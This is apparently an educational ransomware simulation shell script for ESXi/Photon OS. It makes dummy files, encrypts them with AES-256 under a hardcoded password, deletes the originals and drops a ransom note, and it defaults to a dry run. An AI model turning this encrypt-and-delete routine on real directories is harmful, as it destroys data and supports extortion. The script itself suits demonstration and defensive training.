#!/bin/sh
# script.sh — ESXiRansomware demo
# Photon OS–safe; defaults to dry-run. Use --run to actually create, encrypt, and drop a ransom note.

set -eu

# ---- Settings ----
DIR="test"        # output directory
COUNT=10          # number of files
SIZE_KB=100       # ~size per file in KiB (pre-base64)
PASS="RANSOMWARE" # hardcoded demo password
NOTE_NAME="README_FOR_DECRYPT.txt"
# -------------------

DO_RUN=0
case "${1:-}" in
  --run) DO_RUN=1 ;;
  ""|--dry-run|-n) DO_RUN=0 ;;
  *) echo "Usage: $0 [--run]"; exit 1 ;;
esac

need() { command -v "$1" >/dev/null 2>&1 || { echo "Missing '$1'"; exit 1; }; }

if [ "$DO_RUN" -eq 1 ]; then
  need openssl
  need base64
  need dd
  need mkdir
  need rm
  need mv
  mkdir -p "$DIR"
else
  echo "[dry-run] Would create directory '$DIR'"
fi

created=0
encrypted=0
failed=0

i=1
while [ "$i" -le "$COUNT" ]; do
  f="$DIR/file_$i.test"
  if [ "$DO_RUN" -eq 1 ]; then
    {
      echo "=== Sample Document $i ==="
      echo "Timestamp: $(date 2>/dev/null || echo unknown)"
      echo "Notes: This file contains random base64 text for testing encryption workflows."
      echo
      dd if=/dev/urandom bs=1024 count="$SIZE_KB" 2>/dev/null | base64
      echo
      echo "--- End of Document $i ---"
    } > "$f"
    [ -s "$f" ] || echo "Stub content for $f" > "$f"
    created=$((created+1))

    out="$f.☢"
    tmp="$out.tmp"

    if openssl enc -aes-256-cbc -pbkdf2 -salt \
         -pass pass:"$PASS" \
         -in "$f" -out "$tmp"
    then
      mv -f "$tmp" "$out"
      rm -f "$f"
      echo "Encrypted $f → $out"
      encrypted=$((encrypted+1))
    else
      echo "ERROR: encryption failed for $f" >&2
      rm -f "$tmp" 2>/dev/null || true
      failed=$((failed+1))
    fi
  else
    echo "[dry-run] Would create '$f' with ~${SIZE_KB} KiB base64 random data"
    echo "[dry-run] Would encrypt '$f' → '$f.☢' with AES-256-CBC (password: $PASS)"
    echo "[dry-run] Would delete original '$f'"
  fi
  i=$((i+1))
done

# Drop ransom note (real run) or preview (dry-run)
if [ "$DO_RUN" -eq 1 ]; then
  cat > "$DIR/$NOTE_NAME" <<'EOF'
☢ YOUR FILES HAVE BEEN ENCRYPTED ☢

All important files in this system have been locked using AES-256-CBC encryption.
The original files are gone, and only encrypted copies remain.

Do not worry — this is a DEMONSTRATION.
No data has been stolen or exfiltrated.

To restore access, pretend you have the decryption key:
    Password = RANSOMWARE

This project is for EDUCATIONAL PURPOSES ONLY.
It is not malicious ransomware and does not cause real harm.
EOF
  echo "Dropped ransom note: $DIR/$NOTE_NAME"
else
  echo "[dry-run] Would write ransom note to '$DIR/$NOTE_NAME'"
fi

# Summary
if [ "$DO_RUN" -eq 1 ]; then
  echo "Summary: created=$created encrypted=$encrypted failed=$failed dir='$DIR'"
else
  echo "[dry-run] Summary: would create $COUNT files, encrypt them, delete originals, and write '$NOTE_NAME' in '$DIR'."
fi
